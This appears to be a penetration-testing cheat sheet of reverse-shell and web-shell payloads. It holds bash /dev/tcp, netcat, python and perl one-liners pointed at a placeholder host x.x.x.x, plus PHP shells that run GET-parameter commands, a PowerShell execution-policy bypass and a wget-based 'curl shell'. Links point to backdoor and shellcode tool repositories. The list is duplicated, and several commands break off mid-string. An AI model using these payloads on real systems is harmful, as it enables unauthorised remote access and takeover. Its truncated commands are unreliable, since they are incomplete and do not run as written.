# **Shell**

[ttps://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors](https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors)  
[http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)  
[http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)  
[https://github.com/b374k/b374k](https://github.com/b374k/b374k)  
[https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)  
  
  
  
  
`echo "rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc` x.x.x.x  
  
/bin/nc -e /bin/bash x.x.x.x  
  
  
  
Reverse Shells  
  
Bash shell  
bash -i >& /dev/tcp/x.x.x.x  
  
  
Netcat without -e flag  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x  
  
  
Netcat Linux  
nc -e /bin/sh x.x.x.x  
  
  
Netcat Windows  
nc -e cmd.exe x.x.x.x  
  
  
Python  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x  
  
  
Perl  
perl -e 'use Socket;$i="x.x.x.x  
  
  
Remote Desktop  
Remote Desktop for windows with share and 85% screen  
  
rdesktop -u username -p password -g 85% -r disk:share=/root/ x.x.x.x  
  
PHP  
  
PHP command injection from GET Request  
<?php echo system($_GET["cmd"]);?>  
  
#Alternative  
<?php echo shell_exec($_GET["cmd"]);?>  
  
Powershell  
Non-interactive execute powershell file  
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1  
  
Misc  
  
More binaries Path  
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ucb/  
  
  
  
=====================================  
  
Reverse Shells  
Bash shell  
`bash -i >& /dev/tcp/x.x.x.x         `Netcat without -e flag  
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x   `  
  
Netcat Linux  
`nc -e /bin/sh x.x.x.x   `  
  
Netcat Windows  
`nc -e cmd.exe x.x.x.x   `  
  
Python  
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x   `  
  
Perl  
`perl -e 'use Socket;$i="x.x.x.x   `  
  
Remote Desktop  
Remote Desktop for windows with share and 85% screen  
`rdesktop -u username -p password -g 85% -r disk:share=/root/ x.x.x.x   `  
  
PHP  
PHP command injection from GET Request  
`<?php` `echo` `system($_GET[``"cmd"``]);``?>``       #Alternative    ``<?php` `echo` `shell_exec($_GET[``"cmd"``]);``?>``   `  
  
Powershell  
Non-interactive execute powershell file  
`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1   `  
  
Misc  
More binaries Path  
`export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ucb/`  
  
  
#Curl Shell  
[curl -s –data “cmd=wget [http://](http://174.0.42.42:8000/dhn%C2%A0-O)x.x.x.x